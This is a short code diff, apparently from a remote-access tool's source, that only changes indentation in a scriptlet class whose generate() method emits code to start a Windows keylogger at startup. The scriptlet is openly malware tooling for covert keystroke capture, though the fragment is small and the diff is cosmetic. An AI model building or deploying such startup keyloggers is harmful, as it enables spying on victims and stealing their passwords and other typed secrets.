@@ -6,17 +6,17 @@ import textwrap, random, string
 from scriptlets import *
 
 class ScriptletGenerator(Scriptlet):
-	""" start the keylogger at startup """
+    """ start the keylogger at startup """
 
-	dependencies=[("windows/all/pupwinutils/keylogger.py","pupwinutils.keylogger")]
-	arguments={}
+    dependencies=[("windows/all/pupwinutils/keylogger.py","pupwinutils.keylogger")]
+    arguments={}
 
-	def generate(self):
-		return textwrap.dedent("""
-		import sys
-		if sys.platform=="win32":
-			import pupwinutils.keylogger
-			pupwinutils.keylogger.keylogger_start()
-		""")
+    def generate(self):
+        return textwrap.dedent("""
+        import sys
+        if sys.platform=="win32":
+            import pupwinutils.keylogger
+            pupwinutils.keylogger.keylogger_start()
+        """)
 
 
